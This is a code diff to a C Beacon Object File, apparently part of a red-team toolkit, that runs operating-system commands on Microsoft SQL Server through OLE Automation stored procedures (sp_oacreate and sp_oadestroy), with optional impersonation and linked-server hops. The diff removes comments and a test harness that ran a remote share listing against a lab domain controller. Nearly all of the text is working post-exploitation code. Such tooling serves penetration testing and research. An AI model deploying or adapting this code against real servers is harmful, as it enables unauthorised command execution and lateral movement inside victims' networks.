@@ -3,8 +3,7 @@
 #include "sql.c"
 #include "sql_modules.c"
 
-void ExecuteOleCmd(char *server, char *database, char *link, char *impersonate,
-                   char *command, char *user, char *password) {
+void ExecuteOleCmd(char *server, char *database, char *link, char *impersonate, char *command, char *user, char *password) {
   SQLHENV env = NULL;
   SQLHSTMT stmt = NULL;
   SQLHDBC dbc = NULL;
@@ -22,18 +21,12 @@ void ExecuteOleCmd(char *server, char *database, char *link, char *impersonate,
     goto END;
   }
 
-  //
-  // allocate statement handle
-  //
   ret = ODBC32$SQLAllocHandle(SQL_HANDLE_STMT, dbc, &stmt);
   if (!SQL_SUCCEEDED(ret)) {
     internal_printf("[!] Error allocating statement handle\n");
     goto END;
   }
 
-  //
-  // verify that OLE Automation Procedures is enabled
-  //
   if (IsModuleEnabled(stmt, "OLE Automation Procedures", link, impersonate)) {
     internal_printf("[*] OLE Automation Procedures is enabled\n");
   } else {
@@ -41,14 +34,8 @@ void ExecuteOleCmd(char *server, char *database, char *link, char *impersonate,
     goto END;
   }
 
-  //
-  // clear the cursor
-  //
   ODBC32$SQLCloseCursor(stmt);
 
-  //
-  // if using linked server, ensure rpc is enabled
-  //
   if (link != NULL) {
     if (IsRpcEnabled(stmt, link)) {
       internal_printf("[*] RPC out is enabled\n");
@@ -57,9 +44,6 @@ void ExecuteOleCmd(char *server, char *database, char *link, char *impersonate,
       goto END;
     }
 
-    //
-    // close the cursor
-    //
     ODBC32$SQLCloseCursor(stmt);
   }
 
@@ -84,9 +68,6 @@ void ExecuteOleCmd(char *server, char *database, char *link, char *impersonate,
   char *part8 = "; EXEC sp_oadestroy @";           // followed by output
   char *part9 = ";";
 
-  //
-  // build the query string
-  //
   if (link == NULL) {
     totalSize =
         MSVCRT$strlen(part1) + MSVCRT$strlen(output) + MSVCRT$strlen(part2) +
@@ -130,9 +111,6 @@ void ExecuteOleCmd(char *server, char *database, char *link, char *impersonate,
   MSVCRT$strncat(query, output, totalSize - MSVCRT$strlen(query) - 1);
   MSVCRT$strncat(query, part9, totalSize - MSVCRT$strlen(query) - 1);
 
-  //
-  // Run the query
-  //
   if (!HandleQuery(stmt, (SQLCHAR *)query, link, impersonate, TRUE)) {
     goto END;
   }
@@ -152,7 +130,6 @@ END:
   DisconnectSqlServer(env, dbc, stmt);
 }
 
-#ifdef BOF
 VOID go(IN PCHAR Buffer, IN ULONG Length) {
   char *server;
   char *database;
@@ -162,9 +139,6 @@ VOID go(IN PCHAR Buffer, IN ULONG Length) {
   char *user;
   char *password;
 
-  //
-  // parse beacon args
-  //
   datap parser;
   BeaconDataParse(&parser, Buffer, Length);
 
@@ -195,21 +169,3 @@ VOID go(IN PCHAR Buffer, IN ULONG Length) {
 
   printoutput(TRUE);
 };
-
-#else
-
-int main() {
-  internal_printf("============ BASE TEST ============\n\n");
-  ExecuteOleCmd("castelblack.north.sevenkingdoms.local", "master", NULL, NULL,
-                "cmd.exe /c dir \\\\10.2.99.1\\c$", NULL, NULL);
-
-  internal_printf("\n\n============ IMPERSONATE TEST ============\n\n");
-  ExecuteOleCmd("castelblack.north.sevenkingdoms.local", "master", NULL, "sa",
-                "cmd.exe /c dir \\\\10.2.99.1\\c$", NULL, NULL);
-
-  internal_printf("\n\n============ LINK TEST ============\n\n");
-  ExecuteOleCmd("castelblack.north.sevenkingdoms.local", "master", "BRAAVOS",
-                NULL, "cmd.exe /c dir \\\\10.2.99.1\\c$", NULL, NULL);
-}
-
-#endif
